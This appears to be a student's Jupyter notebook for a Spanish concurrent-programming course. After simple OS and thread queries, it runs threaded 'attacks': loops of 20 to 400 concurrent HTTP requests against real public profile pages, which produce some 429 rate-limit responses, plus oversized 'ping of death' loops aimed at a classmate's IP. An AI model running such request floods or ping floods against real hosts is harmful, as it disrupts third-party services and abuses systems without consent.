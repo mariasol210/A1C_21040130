{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1 style = \"text-align:center\"> <b>Programación Concurrente y Distribuida </b> </h1>\n",
    "\n",
    "\n",
    "<a href=\"github.com/mariasol210\">\n",
    "    <img src=\"firma.png\" title = \"Maria Sol Torres Lopez 21940130\" alt=\"Maria Sol Torres Lopez\" width=\"150\" height=\"150\" style=\"float: left;vertical-alig: middle\">\n",
    "    <img src=\"uem.png\" title= \"M23\" alt=\"UE\" width=\"280\" height=\"280\" style=\"float: right;vertical-alig:middle\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "<h2 style=\"text-align:center;\"> <b> CLASS PARTICPATION 1 </b> </h2>\n",
    "\n",
    "---\n",
    "\n",
    "## **Importar Modulos**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Para trabajar con hilos\n",
    "import threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "from IPython import display"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Interactuar con el OS**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3) El numero de proceso que lo maneja y cuantos procesos estan activos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "El proceso que esta manejando este programa es: 28418\n"
     ]
    }
   ],
   "source": [
    "print(\"El proceso que esta manejando este programa es:\", os.getpid())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Se han lanzado 5 hilos\n"
     ]
    }
   ],
   "source": [
    "print(\"Se han lanzado {0} hilos\".format(threading.activeCount()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 4) Cuántos hilos activos tienen lanzados en este momento?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hilos activos en el momento de ejecución: (resaltado en amarillo)\n"
     ]
    }
   ],
   "source": [
    "print(\"Hilos activos en el momento de ejecución: (resaltado en amarillo)\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=\"hilosActivos.png\" alt=\"captura de los hilos activos\" width=\"750\" height=\"750\" style=\"float: left;vertical-alig: middle\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 5) Cuántos cores lógicos tiene su equipo ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Este equipo tiene un total de 4 cores logicos\n"
     ]
    }
   ],
   "source": [
    "print(\"Este equipo tiene un total de {0} cores logicos\".format(os.cpu_count()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 6) Cuántos cores fisicos tiene su equipo ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Este equipo tiene un total de 2.0 cores fisicos \n"
     ]
    }
   ],
   "source": [
    "print(\"Este equipo tiene un total de {0} cores fisicos \".format(os.cpu_count()/2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 7) Enumere e identifique los hilos lanzados ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[<_MainThread(MainThread, started 4466789888)>,\n",
       " <Thread(Thread-2, started daemon 123145569353728)>,\n",
       " <Heartbeat(Thread-3, started daemon 123145586143232)>,\n",
       " <HistorySavingThread(IPythonHistorySavingThread, started 123145604005888)>,\n",
       " <ParentPollerUnix(Thread-1, started daemon 123145621331968)>]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "threading.enumerate()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tenemos un hilo principal llamado Main Thread, el segundo hilo se llama Thread 2 y es de tipo demonio, el tercer hilo llamado HeartBeat también es Daemon y es el que está determinando si el sistema sigue funcionando. El cuarto hilo tambien es demonio y hace el siguimiento del historial cuando grabamos usado por JupyterLab. Por último, el quinto hilo es el Parent y también es demonio"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Ataques con hilos**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Para imprimir las respuestas de los ataques\n",
    "def printRespuesta(link):\n",
    "    ataque= requests.get(link)\n",
    "    print('Respuesta: ', ataque)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 8) Lance un ataque usando 20 hilos a : https://github.com/sukuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 20 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://github.com/sukuzhanay'\n",
    "\n",
    "def ataqueGithub():\n",
    "    ataque = requests.get(link)\n",
    "    print('Hilo activo en este preciso instante', threading.current_thread().getName\n",
    "    ataque\n",
    "    \n",
    "print('\\nAtaque usando 20 hilos ')\n",
    "for i in range(20):\n",
    "    threading.Thread(target=ataqueGithub).start()\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a github"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 9) Lance un ataque usando 30 hilos a : https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 30 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg'\n",
    "\n",
    "def ataqueYouTube():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "    \n",
    "print('\\nAtaque usando 30 hilos ')\n",
    "for i in range(30):\n",
    "    threading.Thread(target=ataqueYouTube).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a YouTube"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 10) Lance un ataque usando 50 hilos a : https://rpubs.com/christian_sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 50 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://rpubs.com/christian_sucuzhanay'\n",
    "    \n",
    "def ataqueRpubs():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 50 hilos ')\n",
    "for i in range(50):\n",
    "    threading.Thread(target=ataqueRpubs).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Rpubs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 11) Lance un ataque usando 100 hilos a : https://rpubs.com/christian_sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 100 hilos \n"
     ]
    }
   ],
   "source": [
    "print('\\nAtaque usando 100 hilos ')\n",
    "for i in range(100):\n",
    "    threading.Thread(target=ataqueRpubs).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Rpubs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 12) Lance un ataque usando 200 hilos a : https://www.kaggle.com/sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 200 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://www.kaggle.com/sukuzhanay'\n",
    "    \n",
    "def ataqueKaggle():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 200 hilos ')\n",
    "for i in range(200):\n",
    "    threading.Thread(target=ataqueKaggle).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Kaggle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [429]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 13) Lance un ataque usando 300 hilos a : https://stackoverflow.com/story/christian-sucuzhanay-arevalo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 300 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://stackoverflow.com/story/christian-sucuzhanay-arevalo'\n",
    "    \n",
    "def ataqueStackoverflow():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 300 hilos ')\n",
    "for i in range(300):\n",
    "    threading.Thread(target=ataqueStackoverflow).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Stackoverflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [429]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 14) Lance un ataque usando 400 hilos a : https://eburnout.com/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 400 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://eburnout.com/'\n",
    "\n",
    "def ataqueEburnout():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 400 hilos ')\n",
    "for i in range(400):\n",
    "    threading.Thread(target=ataqueEburnout).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a eBurnOut"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 15) Qué paginas logró \"tumbar\"?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Se tumbó a Kaggle y Stackoverflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 16) Lance 20 hilos con el ping de la muerte al equipo de su compañero"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Ping de la muerte local"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataquePingLocal():\n",
    "    ataque = !% ping 127.0.0.0 -l 65500 -w 1 -n 1\n",
    "    ataque\n",
    "    \n",
    "for i in range(20):\n",
    "    threading.Thread(target=ataquePingLocal).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Ping de la muerte a Christian"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataquePing():\n",
    "    ataque = !% ping 10.34.80.189 -l 65500 -w 1 -n 1. \n",
    "    ataque\n",
    "    \n",
    "for i in range(20):\n",
    "    threading.Thread(target=ataquePing).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **EJERCICIO EXAMEN PARCIAL**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta del ataque es  si ves esto esd que has hecho bien este punto\n",
      "\n",
      "1 https://eburnout.com/#us\n",
      "2 https://www.kaggle.com/sukuzhanay\n",
      "3 https://www.kaggle.com/sukuzhanay/discussion\n",
      "4 https://google.qwiklabs.com/public_profiles/c094dd66-f266-4f77-a808-a0601b187009\n",
      "5 https://developers.google.com/profile/u/113900657330137227361\n",
      "6 https://anaconda.org/sukuzhanay\n",
      "7 https://stackoverflow.com/users/6025932/christian-vladimir-sucuzhanay\n",
      "8 https://github.com/sukuzhanay\n",
      "9 https://www.unicoos.com/testimonios/page:29\n",
      "10 https://rpubs.com/christian_sucuzhanay/701561\n",
      "11 https://rpubs.com/christian_sucuzhanay/estaciones\n",
      "12 https://g.page/r/CYwda-YNE08qEAE\n",
      "13 https://appadvice.com/app/eburnout/1387560959\n",
      "14 https://stackoverflow.com/story/christian-sucuzhanay-arevalo\n",
      "15 https://christianvladimirsucuzhanay.wordpress.com/2016/01/27/como-hablar-en-publico/comment-page-1/\n",
      "16 https://sites.google.com/view/www-tengounokupa-com/home\n",
      "17 https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg\n",
      "\n"
     ]
    }
   ],
   "source": [
    "def ataque():\n",
    "    ataque = requests.get('https://storage.googleapis.com/examenparcial/cris.txt').text\n",
    "    print('Respuesta del ataque es ',ataque)\n",
    "    \n",
    "ataque()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ataqueLink(link):\n",
    "    ataque = requests.get(link)\n",
    "    print('El estado del ataque es ', ataque)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 1er ataque a https://developers.google.com/profile/u/113900657330137227361"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "link = 'https://developers.google.com/profile/u/113900657330137227361'\n",
    "    \n",
    "for i in range(10):\n",
    "    threading.Thread(target=ataqueLink, args=(link,)).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 2do ataque a https://g.page/r/CYwda-YNE08qEAE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  El estado del ataque es  <Response [200]>\n",
      "<Response [200]>El estado del ataque es  \n",
      "<Response [200]>\n",
      "El estado del ataque es  El estado del ataque es  <Response [200]><Response [200]>\n",
      "El estado del ataque es El estado del ataque es \n",
      " <Response [200]>\n",
      " <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "link = 'https://g.page/r/CYwda-YNE08qEAE'\n",
    "    \n",
    "for i in range(30):\n",
    "    threading.Thread(target=ataqueLink, args=(link,)).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 3er ataque a https://sites.google.com/view/www-tengounokupa-com/home"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es El estado del ataque es  <Response [200]>\n",
      " <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "link = 'https://sites.google.com/view/www-tengounokupa-com/home'\n",
    "    \n",
    "for i in range(5):\n",
    "    threading.Thread(target=ataqueLink, args=(link,)).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 4to ataque a https://anaconda.org/sukuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  El estado del ataque es <Response [200]>El estado del ataque es \n",
      "  <Response [200]>\n",
      "<Response [200]>\n",
      "El estado del ataque es El estado del ataque es   <Response [200]>\n",
      "<Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      " <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es El estado del ataque es  El estado del ataque es <Response [200]> <Response [200]>\n",
      "\n",
      " <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n",
      "El estado del ataque es  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "link = 'https://anaconda.org/sukuzhanay'\n",
    "    \n",
    "for i in range(50):\n",
    "    threading.Thread(target=ataqueLink, args=(link,)).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### No se tumbó ninguna página porque todas las respuestas fueron 200, que significa conexión exitosa. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "display.Image('uem.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[33mcommit 729648b55b0d50f7a66c862f4b322fad1f6de8bb\u001b[m\u001b[33m (\u001b[m\u001b[1;36mHEAD -> \u001b[m\u001b[1;32mmain\u001b[m\u001b[33m, \u001b[m\u001b[1;31morigin/main\u001b[m\u001b[33m, \u001b[m\u001b[1;31morigin/HEAD\u001b[m\u001b[33m)\u001b[m\n",
      "Author: Maria Sol Torres <58983798+mariasol210@users.noreply.github.com>\n",
      "Date:   Thu Mar 18 22:16:00 2021 +0100\n",
      "\n",
      "    Oops\n",
      "\n",
      "\u001b[33mcommit fb4c03f817e75a0be2b0598e8728bb47b1847504\u001b[m\n",
      "Author: Maria Sol Torres <58983798+mariasol210@users.noreply.github.com>\n",
      "Date:   Thu Mar 18 13:26:31 2021 +0100\n",
      "\n",
      "    Añadidas imagenes\n",
      "\n",
      "\u001b[33mcommit e101ab4632cf7e118ccd6b707ccf0e73bf7c1de1\u001b[m\n",
      "Author: Maria Sol Torres <58983798+mariasol210@users.noreply.github.com>\n",
      "Date:   Wed Mar 17 17:21:19 2021 +0100\n",
      "\n",
      "    Completado\n",
      "\n",
      "\u001b[33mcommit b099ee3a3419715da982a05520980957892da636\u001b[m\n",
      "Author: Maria Sol Torres <58983798+mariasol210@users.noreply.github.com>\n",
      "Date:   Wed Mar 17 16:56:05 2021 +0100\n",
      "\n",
      "    Initial commit\n"
     ]
    }
   ],
   "source": [
    "!git log"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "On branch main\n",
      "Your branch is up to date with 'origin/main'.\n",
      "\n",
      "Changes not staged for commit:\n",
      "  (use \"git add <file>...\" to update what will be committed)\n",
      "  (use \"git restore <file>...\" to discard changes in working directory)\n",
      "\t\u001b[31mmodified:   .ipynb_checkpoints/CP1-checkpoint.ipynb\u001b[m\n",
      "\t\u001b[31mmodified:   CP1.ipynb\u001b[m\n",
      "\n",
      "no changes added to commit (use \"git add\" and/or \"git commit -a\")\n"
     ]
    }
   ],
   "source": [
    "! git status"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<o Grado/Concurrente/Jupyter/Examen/A1C_21040130/.git/COMMIT_EDITMSG\" 11L, 312C\u001b[2;1H�\u001b[6n\u001b[2;1H  \u001b[1;1H\u001b[>c\u001b]10;?\u0007\u001b]11;?\u0007\u001b[2;1H# Please enter the commit message for your changes. Lines starting40130/.git/COMMIT_EDITMSG\"\n",
      "# with '#' will be ignored, and an empty message aborts the commit.\n",
      "#\n",
      "# On branch main\n",
      "# Your branch is up to date with 'origin/main'.\n",
      "#\n",
      "# Changes to be committed:\n",
      "#\u001b[7Cmodified:   .ipynb_checkpoints/CP1-checkpoint.ipynb\n",
      "#\u001b[7Cmodified:   CP1.ipynb\n",
      "#\n",
      "\u001b[1m\u001b[34m~                                                                               \u001b[13;1H~                                                                               \u001b[14;1H~                                                                               \u001b[15;1H~                                                                               \u001b[16;1H~                                                                               \u001b[17;1H~                                                                               \u001b[18;1H~                                                                               \u001b[19;1H~                                                                               \u001b[20;1H~                                                                               \u001b[21;1H~                                                                               \u001b[22;1H~                                                                               \u001b[23;1H~                                                                               \u001b[1;1H\u001b[?25h"
     ]
    }
   ],
   "source": [
    "!git commit ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!git push"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
